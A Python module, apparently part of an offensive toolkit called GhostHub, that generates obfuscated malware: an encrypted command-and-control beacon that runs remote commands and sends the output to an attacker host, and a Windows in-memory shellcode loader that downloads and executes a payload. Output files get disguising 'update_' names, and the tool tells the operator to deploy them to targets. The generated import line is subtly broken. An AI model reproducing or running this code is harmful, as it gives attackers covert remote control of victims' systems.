import os
import random
import string
import base64
import questionary
from cryptography.fernet import Fernet
from rich.console import Console
from rich.panel import Panel
from core.ui import draw_header, Q_STYLE

console = Console()


class PayloadForge:
    def __init__(self):
        self.output_dir = "payloads"
        if not os.path.exists(self.output_dir):
            os.makedirs(self.output_dir)
        # Generate a unique AES key for this campaign
        self.aes_key = Fernet.generate_key()

    def generate_random_name(self, extension):
        name = ''.join(random.choices(string.ascii_lowercase, k=12))
        return f"{self.output_dir}/update_{name}.{extension}"

    def forge_http_beacon(self, lhost, lport):
        """Next-Gen C2: AES-Encrypted HTTP Beacon with Sleep/Jitter."""
        raw_code = f"""
import time, requests, subprocess, uuid, platform, random, json
from cryptography.fernet import Fernet

KEY = b'{self.aes_key.decode()}'
cipher = Fernet(KEY)

def encrypt(data): return cipher.encrypt(data.encode()).decode()
def decrypt(data): return cipher.decrypt(data.encode()).decode()

def beacon():
    agent_id = str(uuid.uuid4())[:8]
    sysinfo = platform.system() + " " + platform.release()
    url_ping = "http://{lhost}:{lport}/api/v2/ping"
    url_res = "http://{lhost}:{lport}/api/v2/result"
    
    while True:
        try:
            payload = encrypt(json.dumps({{"id": agent_id, "sysinfo": sysinfo}}))
            r = requests.post(url_ping, data=payload, timeout=5)
            if r.status_code == 200:
                resp = json.loads(decrypt(r.text))
                if resp.get("status") == "task":
                    cmd = resp.get("command")
                    out = subprocess.getoutput(cmd)
                    res_payload = encrypt(json.dumps({{"id": agent_id, "result": out}}))
                    requests.post(url_res, data=res_payload, timeout=5)
        except Exception:
            pass
        # Jitter: Sleep between 10 and 30 seconds to blend with normal traffic
        time.sleep(random.randint(10, 30))
beacon()
"""
        encoded_payload = base64.b64encode(raw_code.encode()).decode()
        return f"import base64,exec;exec(base64.b64decode('{encoded_payload}'))"

    def forge_memory_loader(self, lhost, lport):
        """Advanced Evasion: In-Memory Executable Loader."""
        raw_code = f"""
import ctypes, urllib.request, ssl
def inject():
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        req = urllib.request.Request("http://{lhost}:{lport}/payload.bin", headers={{'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'}})
        shellcode = urllib.request.urlopen(req, context=ctx).read()
        
        ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(shellcode)), ctypes.c_int(0x3000), ctypes.c_int(0x40))
        buf = (ctypes.c_char * len(shellcode)).from_buffer_copy(shellcode)
        ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr), buf, ctypes.c_int(len(shellcode)))
        
        handle = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0), ctypes.c_int(0), ctypes.c_int(ptr), ctypes.c_int(0), ctypes.c_int(0), ctypes.pointer(ctypes.c_int(0)))
        ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle), ctypes.c_int(-1))
    except Exception: pass
inject()
"""
        encoded_payload = base64.b64encode(raw_code.encode()).decode()
        return f"import base64,exec;exec(base64.b64decode('{encoded_payload}'))"

    def run(self):
        draw_header("Payload Forge: Next-Gen Evasion")

        lhost = questionary.text("LHOST (Attacker IP):", style=Q_STYLE).ask()
        if not lhost:
            return
        lport = questionary.text(
            "LPORT (Default 4444):", default="4444", style=Q_STYLE).ask()

        target_type = questionary.select(
            "Target Environment & Tactics:",
            choices=[
                "Cross-Platform (AES-Encrypted HTTP Beacon)",
                "Windows (In-Memory Shellcode Loader)"
            ], style=Q_STYLE
        ).ask()

        if "HTTP Beacon" in target_type:
            payload = self.forge_http_beacon(lhost, lport)
            fname = self.generate_random_name("py")
        elif "In-Memory" in target_type:
            payload = self.forge_memory_loader(lhost, lport)
            fname = self.generate_random_name("py")

        with open(fname, "w") as f:
            f.write(payload)

        # Save the AES key to a local config so the C2 server can read it
        with open("logs/c2_aes.key", "w") as f:
            f.write(self.aes_key.decode())

        console.print(Panel(
            f"[bold green][+] Advanced Payload Generated Successfully![/bold green]\n"
            f"[white]File Path:[/white] [cyan]{fname}[/cyan]\n"
            f"[white]AES Key:[/white] Saved to logs/c2_aes.key\n\n"
            f"[dim]Deploy this file to the target. It will connect back to GhostHub.[/dim]",
            title="Forge Result", border_style="green"
        ))
        questionary.press_any_key_to_continue(style=Q_STYLE).ask()


def generate_shell():
    PayloadForge().run()
